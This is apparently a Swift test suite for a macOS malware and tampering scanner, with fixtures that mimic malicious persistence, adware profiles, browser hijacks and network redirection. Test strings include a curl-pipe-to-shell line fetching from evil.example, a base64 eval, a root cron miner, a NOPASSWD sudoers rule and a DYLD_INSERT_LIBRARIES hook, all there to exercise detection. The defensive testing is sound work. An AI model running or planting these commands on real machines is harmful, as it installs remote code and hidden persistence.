import Foundation
import MaestraleCore
import Testing
@testable import MaestraleModules

func sqlite(_ db: URL, _ sql: String) throws {
    let process = Process()
    process.executableURL = URL(fileURLWithPath: "/usr/bin/sqlite3")
    process.arguments = [db.path, sql]
    try process.run()
    process.waitUntilExit()
    #expect(process.terminationStatus == 0)
}

@Suite struct LoginItemsCheckTests {
    static let dump = """
    ========================
     Records for UID 501 : 12345
    ========================

     Items:

     #1:
                     UUID: AAAA
                     Name: CleanApp
           Developer Name: Vendor Inc.
          Team Identifier: S8EX82NJP6
                     Type: app (0x2)
                    Flags: [  ] (0)
              Disposition: [enabled, allowed, notified] (0xb)
               Identifier: 2.com.vendor.cleanapp
                      URL: /Applications/CleanApp.app
               Generation: 2
        Bundle Identifier: com.vendor.cleanapp
      Embedded Item Identifiers:
        #1: 4.com.vendor.cleanapp.helper

     #2:
                     UUID: BBBB
                     Name: CleanApp Helper
           Developer Name: Vendor Inc.
          Team Identifier: S8EX82NJP6
                     Type: login item (0x4)
                    Flags: [  ] (0)
              Disposition: [enabled, allowed, notified] (0xb)
               Identifier: 4.com.vendor.cleanapp.helper
                      URL: Contents/Library/LoginItems/Helper.app
               Generation: 3
        Bundle Identifier: com.vendor.cleanapp.helper
        Parent Identifier: 2.com.vendor.cleanapp

     #3:
                     UUID: CCCC
                     Name: Updater
           Developer Name: (null)
                     Type: legacy daemon (0x10010)
                    Flags: [ legacy ] (0x1)
              Disposition: [enabled, allowed, notified] (0xb)
               Identifier: 16.com.evil.updater
                      URL: /Library/LaunchDaemons/com.evil.updater.plist
          Executable Path: /Users/Shared/.u/updater
               Generation: 1

     #4:
                     UUID: DDDD
                     Name: Sneaky
           Developer Name: (null)
                     Type: login item (0x4)
                    Flags: [  ] (0)
              Disposition: [disabled, allowed, not notified] (0x2)
               Identifier: 4.com.sneaky
                      URL: /Users/Shared/Sneaky.app
               Generation: 1

     #6:
                     UUID: FFFF
                     Name: CleanApp - background tasks
           Developer Name: Vendor Inc.
                     Type: background tasks (0x2000)
                    Flags: [  ] (0)
              Disposition: [enabled, allowed, notified] (0xb)
               Identifier: 8192.com.vendor.cleanapp
                      URL: (null)
               Generation: 1
        Parent Identifier: 2.com.vendor.cleanapp

     #7:
                     UUID: GGGG
                     Name: Squirrel
           Developer Name: (null)
                     Type: agent (0x8)
              Disposition: [enabled, disallowed, notified] (0x9)
               Identifier: 8.com.vendor.squirrel
                      URL: Contents/Library/LaunchAgents/com.vendor.squirrel.plist
          Executable Path: Contents/Frameworks/Squirrel.framework/Versions/A/Squirrel
        Parent Identifier: 2.com.vendor.cleanapp

     #5:
                     UUID: EEEE
                     Name: Agent
           Developer Name: (null)
                     Type: agent (0x8)
                    Flags: [  ] (0)
              Disposition: [enabled, allowed, notified] (0xb)
               Identifier: 8.com.sneaky.agent
                      URL: /Users/Shared/.agent/run
               Generation: 1
    """

    @Test func parsesRecords() {
        let items = BackgroundItem.parse(Self.dump)
        #expect(items.count == 7)
        #expect(items[0].type == "app")
        #expect(items[0].team == "S8EX82NJP6")
        #expect(items[1].parent == "2.com.vendor.cleanapp")
        #expect(items[2].developer == nil)
        #expect(items[2].executable == "/Users/Shared/.u/updater")
        #expect(items[3].isEnabled == false)
        #expect(items[4].url == nil)
        #expect(items[5].isEnabled == false) // disallowed
        #expect(items[6].isEnabled == true)
        let byID = Dictionary(items.map { ($0.identifier, $0) }, uniquingKeysWith: { a, _ in a })
        #expect(LoginItemsCheck.executablePath(items[1], parents: byID) == "/Applications/CleanApp.app/Contents/Library/LoginItems/Helper.app")
        #expect(LoginItemsCheck.executablePath(items[4], parents: byID) == "/Applications/CleanApp.app")
        #expect(LoginItemsCheck.executablePath(items[5], parents: byID) == "/Applications/CleanApp.app/Contents/Frameworks/Squirrel.framework/Versions/A/Squirrel")
    }

    @Test func flagsSharedFolderAgentsAndSkipsLegacyAndDisabled() throws {
        let home = try TempHome(); defer { home.remove() }
        let commands = FakeCommands(["/usr/bin/sfltool dumpbtm": Self.dump])
        let signatures = FakeSignatures(["/Users/Shared/.agent/run": .unsigned], fallback: .signed(team: "S8EX82NJP6", notarized: true))
        let findings = LoginItemsCheck().run(home.context(signatures: signatures, commands: commands))
        #expect(findings.count == 1)
        let agent = try #require(findings.first)
        #expect(agent.title == "Agent")
        #expect(agent.severity == .danger)
        #expect(agent.reasons.contains("Avviato da una cartella temporanea o condivisa"))
        #expect(agent.id == "persistence|btm|8.com.sneaky.agent")
    }
}

@Suite struct CronAndShellCheckTests {
    @Test func downloadAndRunInZshrcIsDanger() throws {
        let home = try TempHome(); defer { home.remove() }
        try home.write(".zshrc", """
        # comment with curl http://x | sh is fine
        export PATH=$HOME/bin:$PATH
        curl -fsSL https://evil.example/i.sh | sh
        eval "$(echo aGk= | base64 -d)"
        """)
        let check = CronAndShellCheck(systemFiles: [])
        let findings = check.run(home.context())
        let zshrc = try #require(findings.first { $0.title == ".zshrc" })
        #expect(zshrc.severity == .danger)
        #expect(zshrc.reasons.contains("Scarica ed esegue codice dalla rete"))
        #expect(zshrc.reasons.contains("Decodifica codice nascosto in base64"))
        #expect(CronAndShellCheck.matches(#"eval "$(/opt/homebrew/bin/brew shellenv)""#).isEmpty)
        #expect(CronAndShellCheck.matches(#"eval "$(curl -s http://x/y)""#).map(\.severity) == [.warning])
        #expect(zshrc.evidence.contains("curl -fsSL https://evil.example/i.sh | sh"))
        #expect(!zshrc.evidence.contains("export PATH=$HOME/bin:$PATH"))
    }

    @Test func recentlyModifiedCleanFileIsInfoAndOldOneIsSilent() throws {
        let home = try TempHome(); defer { home.remove() }
        let recent = try home.write(".zprofile", "export EDITOR=vim\n")
        let old = try home.write(".bashrc", "alias ll='ls -l'\n")
        try FileManager.default.setAttributes([.modificationDate: Date().addingTimeInterval(-100 * 86_400)], ofItemAtPath: old.path)
        let findings = CronAndShellCheck(systemFiles: []).run(home.context())
        #expect(findings.map(\.path) == [recent])
        #expect(findings.first?.severity == .info)
    }

    @Test func cronJobsAreListedAndDangerousOnesFlagged() throws {
        let home = try TempHome(); defer { home.remove() }
        let commands = FakeCommands(["/usr/bin/crontab -l": "0 * * * * /Users/me/scripts/backup.sh\n"])
        let user = CronAndShellCheck(systemFiles: []).run(home.context(commands: commands))
        let cron = try #require(user.first { $0.id == "persistence|crontab" })
        #expect(cron.severity == .info)
        #expect(cron.evidence == ["0 * * * * /Users/me/scripts/backup.sh"])

        let evidence = SystemEvidence.parse("""
        ### crontabs
        ## /usr/lib/cron/tabs/root
        */5 * * * * /tmp/.x/miner
        ### sudoers
        ## /etc/sudoers.d/papa
        papa ALL=(ALL) NOPASSWD: ALL
        ### lsof
        """)
        let context = CheckContext(home: home.url, signatures: FakeSignatures(), commands: FakeCommands(), launchItems: [], systemEvidence: evidence)
        let findings = CronAndShellCheck(systemFiles: []).run(context)
        let root = try #require(findings.first { $0.id == "persistence|crontab|root" })
        #expect(root.severity == .danger)
        #expect(root.title == "Cron di root")
        let sudoers = try #require(findings.first { $0.id == "configuration|sudoers-nopasswd" })
        #expect(sudoers.evidence == ["papa ALL=(ALL) NOPASSWD: ALL"])
        #expect(evidence["lsof"] == "")
    }
}

@Suite struct ProfilesCheckTests {
    @Test func dnsProfileIsDangerAndPlainProfileIsWarning() throws {
        let home = try TempHome(); defer { home.remove() }
        let xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict>
          <key>nico</key><array>
            <dict>
              <key>ProfileDisplayName</key><string>Search Helper</string>
              <key>ProfileIdentifier</key><string>com.adware.search</string>
              <key>ProfileItems</key><array>
                <dict><key>PayloadType</key><string>com.apple.dnsSettings.managed</string></dict>
                <dict><key>PayloadType</key><string>com.apple.ManagedClient.preferences</string></dict>
              </array>
            </dict>
            <dict>
              <key>ProfileDisplayName</key><string>Wi-Fi scuola</string>
              <key>ProfileIdentifier</key><string>it.scuola.wifi</string>
              <key>ProfileItems</key><array>
                <dict><key>PayloadType</key><string>com.apple.wifi.managed</string></dict>
              </array>
            </dict>
          </array>
        </dict></plist>
        """
        let commands = FakeCommands(["/usr/bin/profiles list -output stdout-xml": xml])
        let findings = ProfilesCheck().run(home.context(commands: commands))
        #expect(findings.count == 2)
        let adware = try #require(findings.first { $0.title == "Profilo: Search Helper" })
        #expect(adware.severity == .danger)
        #expect(adware.reasons.contains("Cambia i server DNS"))
        #expect(adware.evidence.contains("Payload: com.apple.dnsSettings.managed"))
        #expect(findings.first { $0.title == "Profilo: Wi-Fi scuola" }?.severity == .warning)
    }

    @Test func noProfilesProducesNothing() throws {
        let home = try TempHome(); defer { home.remove() }
        let commands = FakeCommands(["/usr/bin/profiles list -output stdout-xml": "There are no configuration profiles installed for user 'nico'\n"])
        #expect(ProfilesCheck().run(home.context(commands: commands)).isEmpty)
    }
}

@Suite struct TrustedRootsCheckTests {
    @Test func customTrustIsDangerAndDenyIsInfo() throws {
        let home = try TempHome(); defer { home.remove() }
        let commands = FakeCommands([
            "/usr/bin/security dump-trust-settings -d": """
            Number of trusted certs = 2
            Cert 0: Adware Root CA
               Number of trust settings : 1
               Trust Setting 0:
                  Policy OID            : SSL
                  Result Type           : kSecTrustResultProceed
            Cert 1: Old Corp CA
               Number of trust settings : 1
               Trust Setting 0:
                  Result Type           : kSecTrustResultDeny
            """,
            "/usr/bin/security dump-trust-settings": "SecTrustSettingsCopyCertificates: No Trust Settings were found.\n",
        ])
        let findings = TrustedRootsCheck().run(home.context(commands: commands))
        #expect(findings.count == 2)
        #expect(findings.first { $0.title == "Certificato fidato: Adware Root CA" }?.severity == .danger)
        #expect(findings.first { $0.title == "Certificato fidato: Old Corp CA" }?.severity == .info)
    }
}

@Suite struct SystemExtensionsCheckTests {
    @Test func parsesSystemExtensionsAndKexts() throws {
        let home = try TempHome(); defer { home.remove() }
        let commands = FakeCommands([
            "/usr/bin/systemextensionsctl list": "2 extension(s)\n--- com.apple.system_extension.network_extension\nenabled\tactive\tteamID\tbundleID (version)\tname\t[state]\n*\t*\tJ6S6Q257EK\tch.protonvpn.mac.WireGuard-Extension (6.1.0/2695771)\tProton VPN WireGuard\t[activated enabled]\n\t\tJ6S6Q257EK\tch.protonvpn.mac.Old (1.0)\tOld\t[terminated]\n",
            "/usr/bin/kmutil showloaded --list-only": "No variant specified, falling back to release\nIndex Refs Address            Size       Wired      Name (Version) UUID <Linked Against>\n    3  208 0                  0          0          com.apple.kpi.bsd (27.0.0) 1F15 <>\n  180    0 0xfffffe0010000000 0x7000     0x7000     com.vendor.driver (1.2) ABCD <5 4 3>\n",
        ])
        let findings = SystemExtensionsCheck().run(home.context(commands: commands))
        #expect(findings.count == 2)
        let network = try #require(findings.first { $0.id == "configuration|sysext|ch.protonvpn.mac.WireGuard-Extension" })
        #expect(network.severity == .info)
        #expect(network.title == "Estensione di rete: Proton VPN WireGuard")
        #expect(findings.first { $0.id == "configuration|kext|com.vendor.driver" }?.severity == .warning)
    }
}

@Suite struct BrowserHijackCheckTests {
    @Test func chromiumHomepageStartupAndSearchEngine() throws {
        let home = try TempHome(); defer { home.remove() }
        try home.write("Library/Application Support/Google/Chrome/Default/Preferences", """
        {"homepage":"http://search-helper.example/home","homepage_is_newtabpage":false,
         "session":{"restore_on_startup":4,"startup_urls":["https://www.google.com","http://ads.example/start"]},
         "default_search_provider_data":{"template_url_data":{"short_name":"Fast Search","keyword":"fs","url":"https://fastsearch.example/?q={searchTerms}"}}}
        """)
        try home.write("Library/Application Support/BraveSoftware/Brave-Browser/Default/Preferences", """
        {"homepage":"https://www.google.com","session":{"restore_on_startup":1},
         "default_search_provider_data":{"template_url_data":{"short_name":"DuckDuckGo","url":"https://duckduckgo.com/?q={searchTerms}"}}}
        """)
        let findings = BrowserHijackCheck().run(home.context())
        #expect(findings.count == 3)
        #expect(findings.allSatisfy { $0.title.hasPrefix("Google Chrome") })
        #expect(findings.first { $0.id.hasSuffix("|search") }?.severity == .danger)
        #expect(findings.first { $0.id.hasSuffix("|startup") }?.evidence.contains("startup_urls: http://ads.example/start") == true)
        #expect(findings.first { $0.id.hasSuffix("|homepage") }?.reasons == ["Pagina iniziale impostata su search-helper.example"])
    }
}

@Suite struct NetworkConfigCheckTests {
    @Test func hostsProxyDNSAndInjection() throws {
        let home = try TempHome(); defer { home.remove() }
        let hosts = try home.write("hosts", """
        ##
        127.0.0.1\tlocalhost
        255.255.255.255\tbroadcasthost
        ::1             localhost
        127.0.0.1 ads.example # blocked
        0.0.0.0 tracker.example
        93.184.216.34 update.apple.com
        """)
        let commands = FakeCommands([
            "/usr/sbin/networksetup -listallnetworkservices": "An asterisk (*) denotes that a network service is disabled.\nWi-Fi\n*Thunderbolt Bridge\n",
            "/usr/sbin/networksetup -getwebproxy Wi-Fi": "Enabled: Yes\nServer: 10.0.0.9\nPort: 8080\nAuthenticated Proxy Enabled: 0\n",
            "/usr/sbin/networksetup -getsecurewebproxy Wi-Fi": "Enabled: No\nServer: \nPort: 0\n",
            "/usr/sbin/networksetup -getsocksfirewallproxy Wi-Fi": "Enabled: No\nServer: \nPort: 0\n",
            "/usr/sbin/networksetup -getautoproxyurl Wi-Fi": "URL: http://evil.example/proxy.pac\nEnabled: Yes\n",
            "/usr/sbin/scutil --dns": "resolver #1\n  nameserver[0] : 192.168.1.1\n  nameserver[1] : 45.67.89.10\nresolver #2\n  nameserver[0] : 8.8.8.8\n",
            "/bin/launchctl getenv DYLD_INSERT_LIBRARIES": "/Users/Shared/hook.dylib\n",
        ])
        let findings = NetworkConfigCheck(hostsFile: hosts).run(home.context(commands: commands))
        let byKey = Dictionary(uniqueKeysWithValues: findings.map { ($0.id, $0) })
        #expect(byKey["network|hosts-redirect"]?.severity == .danger)
        #expect(byKey["network|hosts-redirect"]?.evidence == ["93.184.216.34 update.apple.com"])
        #expect(NetworkConfigCheck.looksPublic("update.apple.com"))
        #expect(!NetworkConfigCheck.looksPublic("flowise.vibe"))
        #expect(byKey["network|hosts-block"]?.title == "/etc/hosts blocca 2 nomi")
        #expect(byKey["network|proxy|Wi-Fi|HTTP"]?.severity == .danger)
        #expect(byKey["network|proxy|Wi-Fi|HTTPS"] == nil)
        #expect(byKey["network|pac|Wi-Fi"]?.reasons.first?.contains("evil.example/proxy.pac") == true)
        #expect(byKey["network|dns"]?.title == "Server DNS insoliti: 45.67.89.10")
        #expect(byKey["configuration|dyld-insert"]?.severity == .danger)
        #expect(findings.filter { $0.id.contains("Thunderbolt") }.isEmpty)
    }

    @Test func cleanNetworkIsSilent() throws {
        let home = try TempHome(); defer { home.remove() }
        let hosts = try home.write("hosts", "127.0.0.1 localhost\n::1 localhost\n")
        let commands = FakeCommands([
            "/usr/sbin/networksetup -listallnetworkservices": "An asterisk (*) denotes that a network service is disabled.\nWi-Fi\n",
            "/usr/sbin/scutil --dns": "  nameserver[0] : 192.168.1.1\n  nameserver[0] : 1.1.1.1\n",
        ])
        #expect(NetworkConfigCheck(hostsFile: hosts).run(home.context(commands: commands)).isEmpty)
    }
}

@Suite struct TCCCheckTests {
    @Test func unsignedAppWithInputMonitoringIsDanger() throws {
        let home = try TempHome(); defer { home.remove() }
        let db = home.url.appendingPathComponent("TCC.db")
        try sqlite(db, """
        CREATE TABLE access (service TEXT, client TEXT, client_type INTEGER, auth_value INTEGER);
        INSERT INTO access VALUES ('kTCCServiceListenEvent', '/Users/Shared/.k/logger', 1, 2);
        INSERT INTO access VALUES ('kTCCServiceAccessibility', '/Applications/Good.app', 1, 2);
        INSERT INTO access VALUES ('kTCCServiceScreenCapture', '/Applications/Denied.app', 1, 0);
        INSERT INTO access VALUES ('kTCCServiceCamera', '/Applications/Cam.app', 1, 2);
        """)
        let signatures = FakeSignatures(["/Users/Shared/.k/logger": .unsigned, "/Applications/Good.app": .signed(team: "GOOD", notarized: true)])
        let findings = TCCCheck(userDatabase: db).run(home.context(signatures: signatures))
        #expect(findings.count == 2)
        let logger = try #require(findings.first { $0.title == "logger: Monitoraggio input" })
        #expect(logger.severity == .danger)
        #expect(logger.reasons.count == 3)
        let good = try #require(findings.first { $0.title == "Good.app: Accessibilità" })
        #expect(good.severity == .info)
        #expect(good.team == "GOOD")
    }

    @Test func systemGrantsComeFromEvidence() throws {
        let home = try TempHome(); defer { home.remove() }
        let evidence = SystemEvidence.parse("### tcc\nkTCCServiceSystemPolicyAllFiles|/Library/Tools/agent|1|2\nkTCCServiceSystemPolicyAllFiles|/Library/Tools/old|1|0\n")
        let context = CheckContext(home: home.url, signatures: FakeSignatures(fallback: .adHoc), commands: FakeCommands(),
                                   launchItems: [], systemEvidence: evidence)
        let findings = TCCCheck(userDatabase: home.url.appendingPathComponent("missing.db")).run(context)
        #expect(findings.count == 1)
        #expect(findings.first?.id == "configuration|tcc|sistema|kTCCServiceSystemPolicyAllFiles|/Library/Tools/agent")
        #expect(findings.first?.severity == .danger)
    }
}

@Suite struct RecentInstallsCheckTests {
    @Test func quarantineAttributeAndEventGiveTheOrigin() throws {
        let home = try TempHome(); defer { home.remove() }
        let apps = home.url.appendingPathComponent("Applications")
        let app = apps.appendingPathComponent("Fresh.app")
        try FileManager.default.createDirectory(at: app.appendingPathComponent("Contents/MacOS"), withIntermediateDirectories: true)
        let mark = "0083;6720a000;Safari;ABCD-1234"
        #expect(setxattr(app.path, "com.apple.quarantine", mark, mark.utf8.count, 0, 0) == 0)
        let db = home.url.appendingPathComponent("Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2")
        try FileManager.default.createDirectory(at: db.deletingLastPathComponent(), withIntermediateDirectories: true)
        try sqlite(db, """
        CREATE TABLE LSQuarantineEvent (LSQuarantineEventIdentifier TEXT PRIMARY KEY, LSQuarantineTimeStamp REAL, LSQuarantineAgentBundleIdentifier TEXT, LSQuarantineAgentName TEXT, LSQuarantineDataURLString TEXT, LSQuarantineSenderName TEXT, LSQuarantineSenderAddress TEXT, LSQuarantineTypeNumber INTEGER, LSQuarantineOriginTitle TEXT, LSQuarantineOriginURLString TEXT, LSQuarantineOriginAlias BLOB);
        INSERT INTO LSQuarantineEvent (LSQuarantineEventIdentifier, LSQuarantineTimeStamp, LSQuarantineAgentName, LSQuarantineDataURLString, LSQuarantineOriginURLString) VALUES ('ABCD-1234', 780000000, 'Safari', 'https://cdn.example/Fresh.dmg', 'https://fresh.example/download');
        """)
        let copied = apps.appendingPathComponent("Copied.app")
        try FileManager.default.createDirectory(at: copied.appendingPathComponent("Contents/MacOS"), withIntermediateDirectories: true)

        let signatures = FakeSignatures([app.path: .signed(team: "T", notarized: true), copied.path: .adHoc])
        let findings = RecentInstallsCheck(folders: [apps]).run(home.context(signatures: signatures))
        #expect(findings.count == 2)
        let fresh = try #require(findings.first { $0.title == "Fresh.app" })
        #expect(fresh.severity == .info)
        #expect(fresh.reasons == ["Scaricata con Safari da cdn.example"])
        #expect(fresh.evidence.contains("URL: https://cdn.example/Fresh.dmg"))
        let copiedFinding = try #require(findings.first { $0.title == "Copied.app" })
        #expect(copiedFinding.severity == .warning)
        #expect(copiedFinding.reasons.first?.hasPrefix("Nessuna traccia del download") == true)
        let updated = apps.appendingPathComponent("Updated.app")
        try FileManager.default.createDirectory(at: updated.appendingPathComponent("Contents/MacOS"), withIntermediateDirectories: true)
        let notarized = FakeSignatures([updated.path: .signed(team: "T", notarized: true)], fallback: .adHoc)
        #expect(RecentInstallsCheck(folders: [apps]).run(home.context(signatures: notarized)).map(\.title).sorted() == ["Copied.app", "Fresh.app"])
        #expect(copiedFinding.reasons.contains("Firma ad-hoc"))
        #expect(RecentInstallsCheck.QuarantineAttribute("0083;6720a000;Safari;ABCD-1234")?.eventIdentifier == "ABCD-1234")
        #expect(RecentInstallsCheck.QuarantineAttribute("0081;6720a000;;")?.agent == nil)
    }
}

@Suite struct PluginkitParsingTests {
    @Test func parsesBlocks() {
        let text = """
             com.vendor.app.SafariExtension(2.1)
                   Path = /Applications/Vendor.app/Contents/PlugIns/Ext.appex
                   UUID = 1234
              Timestamp = 2026-10-01 10:00:00 +0000
                    SDK = com.apple.Safari.web-extension
          Parent Bundle = /Applications/Vendor.app
           Display Name = Vendor Blocker
        +    com.other.ext(1.0)
                   Path = /Users/Shared/Other.app/Contents/PlugIns/O.appex
          Parent Bundle = /Users/Shared/Other.app
           Display Name = Other
        """
        let plugins = BrowserExtensionsCheck.parsePluginkit(text)
        #expect(plugins.count == 2)
        #expect(plugins[0]["id"] == "com.vendor.app.SafariExtension")
        #expect(plugins[0]["Display Name"] == "Vendor Blocker")
        #expect(plugins[1]["Parent Bundle"] == "/Users/Shared/Other.app")
        #expect(BrowserExtensionsCheck.parsePluginkit("(no matches)\n").isEmpty)
    }

    @Test func safariExtensionOutsideApplicationsIsWarning() throws {
        let home = try TempHome(); defer { home.remove() }
        let commands = FakeCommands(["/usr/bin/pluginkit -mAvvv -p com.apple.Safari.web-extension": """
             com.other.ext(1.0)
                   Path = /Users/Shared/Other.app/Contents/PlugIns/O.appex
          Parent Bundle = /Users/Shared/Other.app
           Display Name = Other
        """])
        let findings = BrowserExtensionsCheck().run(home.context(signatures: FakeSignatures(fallback: .signed(team: "T", notarized: true)), commands: commands))
        let other = try #require(findings.first)
        #expect(other.title == "Safari: Other")
        #expect(other.severity == .danger)
    }
}
